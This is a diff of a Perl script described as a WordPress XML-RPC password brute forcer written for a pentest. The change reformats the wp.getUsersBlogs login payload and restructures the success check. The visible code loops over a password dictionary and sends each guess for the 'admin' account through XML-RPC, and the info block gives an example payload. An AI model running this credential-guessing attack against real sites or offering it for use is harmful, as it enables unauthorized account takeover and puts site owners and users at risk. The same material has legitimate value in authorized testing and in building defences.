@@ -1,8 +1,6 @@
 #!/usr/bin/perl -wU
 
-
-# WP PingBack password Brute Forcer (DIIIIRTY !)
-# Scripted for specific need during pentest so be cool pls
+# WP PingBack password Brute Forcer (DIIIIRTY ! )
 
 use 5.010;
 use IO::File;
@@ -33,8 +31,16 @@ while (my $Reading = $Handle->getline()) {
 				<methodCall>
 				<methodName>wp.getUsersBlogs</methodName>
 				<params>
-				<param><value><string>admin</string></value></param>
-				<param><value><string>'.$pass.'</string></value></param>
+				<param>
+				<value>
+					<string>admin</string>
+				</value>
+				</param>
+				<param>
+				<value>
+					<string>'.$pass.'</string>
+				</value>
+				</param>
 				</params>
 				</methodCall>
 				';
@@ -63,9 +69,10 @@ while (my $Reading = $Handle->getline()) {
 						 $output->close;
 					}
 					last;
+				}else{
+					say colored"[*] Password found using this payload: $Output !",'bold green';
+					exit;
 				}
-			say colored"[*] Password found using this payload: $Output !",'bold green';
-			exit;
 			}
 		}
 }
@@ -79,19 +86,22 @@ say "[-] Hope that you find something...";
 
 
 =info
-
-- Think to adapt it if needed (including dictionary file path)
-
-- Example of payload used:
 test.txt:
 
 	<?xml version="1.0" encoding="iso-8859-1"?>
 	<methodCall>
 	<methodName>wp.getUsersBlogs</methodName>
-	    <params>
-	       <param><value> <string>admin</string></value></param>
-	       <param><value><string>password</string></value></param>
-	    </params>
+	<params>
+	<param>
+	<value>
+		<string>admin</string>
+	</value>
+	</param>
+	<param>
+	<value>
+		<string>password</string>
+	</value>
+	</param>
+	</params>
 	</methodCall>
-
 =cut
